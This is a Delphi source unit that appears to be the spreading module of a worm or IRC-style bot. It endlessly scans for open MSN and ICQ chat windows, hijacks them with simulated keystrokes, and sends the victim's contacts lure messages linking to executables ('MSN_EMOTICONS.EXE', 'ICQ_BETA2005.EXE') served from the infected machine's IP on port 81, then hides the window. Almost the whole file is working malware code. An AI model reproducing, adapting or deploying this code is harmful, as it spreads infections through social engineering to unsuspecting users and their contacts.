unit pMSN;

interface

uses
  Windows, Winsock, Bot;

var
  Buf   : Array[0..4000] Of Char;

  Wins  : Array[0..300 ] Of Record
    Name: String;
    Wnd : HWND;
  End;

  wCNT  : Integer = 0;
  Procedure ICQMSN;
  Procedure MSN(Title: HWND);
  Procedure ICQ(Title: String);

implementation

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function StrLCopy(Dest: PChar; Const Source: PChar; MaxLen: Cardinal): PChar; assembler;
asm
        PUSH    EDI
        PUSH    ESI
        PUSH    EBX
        MOV     ESI,EAX
        MOV     EDI,EDX
        MOV     EBX,ECX
        XOR     AL,AL
        TEST    ECX,ECX
        JZ      @@1
        REPNE   SCASB
        JNE     @@1
        INC     ECX
@@1:    SUB     EBX,ECX
        MOV     EDI,ESI
        MOV     ESI,EDX
        MOV     EDX,EDI
        MOV     ECX,EBX
        SHR     ECX,2
        REP     MOVSD
        MOV     ECX,EBX
        AND     ECX,3
        REP     MOVSB
        STOSB
        MOV     EAX,EDX
        POP     EBX
        POP     ESI
        POP     EDI
end;

function StrPCopy(Dest: PChar; const Source: string): PChar;
begin
  Result := StrLCopy(Dest, PChar(Source), Length(Source));
end;

Function GetHandleFromWindowTitle(TitleText: String): HWND;
Var
  strBuf: Array[0..$ff] Of Char;
Begin
  Result := FindWindow(pChar(0), StrPCopy(StrBuf, TitleText));
End;

procedure SendKey(const text: String);
var
   i: Integer;
   shift: Boolean;
   vk,scancode: Word;
   ch: Char;
   c,s: Byte;
const
   vk_keys: Array[0..9] of Byte =
      (VK_HOME,VK_END,VK_UP,VK_DOWN,VK_LEFT,
        VK_RIGHT,VK_PRIOR,VK_NEXT,VK_INSERT,
        VK_DELETE);
   vk_shft: Array[0..2] of Byte =
     (VK_SHIFT,VK_CONTROL,VK_MENU);
   flags: Array[false..true] of Integer =
     (KEYEVENTF_KEYUP, 0);
begin
   shift := false;
   for i := 1 to Length(text) do
   begin
      ch := text[i];
      if ch >= #250 then
      begin
         s := Ord(ch) - 250;
         shift := not Odd(s);
         c := vk_shft[s shr 1];
         scancode := MapVirtualKey(c,0);
         Keybd_Event(c,scancode,flags[shift],0);
      end
      else
      begin
         vk := 0;
         if ch >= #240 then
            c := vk_keys[Ord(ch) - 240]
         else if ch >= #228 then
            c := Ord(ch) - 116
         else if ch < #32 then
            c := Ord(ch)
         else
         begin
            vk :=VkKeyScan(ch);
            c :=LoByte(vk);
         end;
         scancode := MapVirtualKey(c,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,$2A,0,0);
         Keybd_Event(c,scancode,0,0);
         Keybd_Event(c,scancode,KEYEVENTF_KEYUP,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,
               $2A,KEYEVENTF_KEYUP,0);
      end;
   end;
end;

procedure MakeWindowActive(wHandle: hWnd);
begin
  if IsIconic(wHandle) then
   ShowWindow(wHandle, SW_RESTORE)
  else
   setforegroundwindow(wHandle);
end;

Function EnumWinProc(W: Hwnd; Lpr: LParam): Bool; Stdcall;
Begin
  If IsWindowVisible(W) Then
  Begin
    GetWindowText(W, Buf, 10000);
    If Buf[0] <> #0 Then
    Begin
      Wins[WCNT].Name := Buf;
      Wins[WCNT].Wnd := W;
      inc(WCNT);
    End;
  End;
  Result := True;
End;

Procedure GetWindows;
Var
  I: Integer;
Begin
  WCNT := 0;
  EnumWindows(@EnumWinProc, 0);
  For I := 0 To WCNT -1 Do
  Begin
    If Pos(' - konversation', LowerCase(Wins[i].Name)) > 0 Then MSN(Wins[i].WND);
    If Pos(' - conversation', LowerCase(Wins[i].Name)) > 0 Then MSN(Wins[i].WND);
    If Pos(' - message session', LowerCase(Wins[i].Name)) > 0 Then ICQ(Wins[i].Name);
    Wins[I].Name := '';
    Wins[I].Wnd := 0;
    Sleep(1024);
  End;
End;

Procedure MSN(Title: HWND);
Var
  I     : Integer;
  D     : HWND;
  URL   : String;
  C     : String;
Begin
  URL := #250'c'#251'heck this out '#250'.d'#251'  http'#250'.77'#251;
  URL := URL + GetIP + #250'.'#251'81'#250'7MSN_EMOTICONS'#251'.'#250'EXE'#251;

  D := Title;
  MakeWindowActive(D);
  Sleep(2000);
  SendKey(URL);
  SendKey(#13#10);
  SetWindowText(D, pChar('synd..'));
  ShowWindow(D, 0);
End;

Procedure ICQ(Title: String);
Var
  I     : Integer;
  D     : HWND;
  URL   : String;
  C     : String;
Begin
  URL := #250'C'#251'heck this out, i got my hands on the new icq.  http'#250'.77'#251;
  URL := URL + GetIP + #250'.'#251'81'#250'7ICQ_BETA'#251'2005.'#250'EXE'#251;

  D := GetHandleFromWindowTitle(Title);
  MakeWindowActive(D);
  SetWindowText(D, pChar('synd..'));
  Sleep(2000);
  SendKey(URL);
  SendKey(#254's'#255);
  ShowWindow(D, 0);
End;

Procedure ICQMSN;
Begin
  Repeat
    GetWindows;
    Sleep(5000);
  Until 1 = 2;
End;

end.
